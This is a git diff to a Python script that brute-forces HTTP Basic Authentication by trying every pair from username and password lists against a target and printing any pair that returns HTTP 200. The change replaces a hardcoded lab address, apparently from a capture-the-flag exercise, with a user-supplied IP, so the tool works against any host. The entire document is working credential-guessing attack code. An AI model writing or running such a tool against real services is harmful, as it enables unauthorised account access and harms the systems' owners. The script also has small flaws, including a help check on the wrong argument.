@@ -7,11 +7,12 @@ usage="""
 Brute Force Basic Authentication
 python3 basic-auth-bf.py -i [IP_ADDRESS] -U [username_list] -P [password_list]
 """
-if   sys.argv[0] == "--help" or sys.argv[0] == "-h":
+if  len(sys.argv) != 7 or sys.argv[0] == "--help" or sys.argv[0] == "-h":
     print(usage)
 else:
     username_list=sys.argv[4]
     password_list=sys.argv[6]
+    ip_addess=sys.argv[2]
 
     with open(username_list) as fp:
         user_lines = fp.readlines()
@@ -23,7 +24,7 @@ else:
                     message_bytes = uss_pass.encode('ascii')
                     base64_bytes = base64.b64encode(message_bytes)
                     base64_message = base64_bytes.decode('ascii')
-                    r = requests.get("http://10.10.100.172/inferno/", headers={"Authorization": "Basic {0}".format(base64_message)})
+                    r = requests.get("http://" + ip_addess, headers={"Authorization": "Basic {0}".format(base64_message)})
                     print(f"Checking... {uss_pass}")
                     if r.status_code == 200:
                         print(f"\n\nFOUND: {uss_pass}")
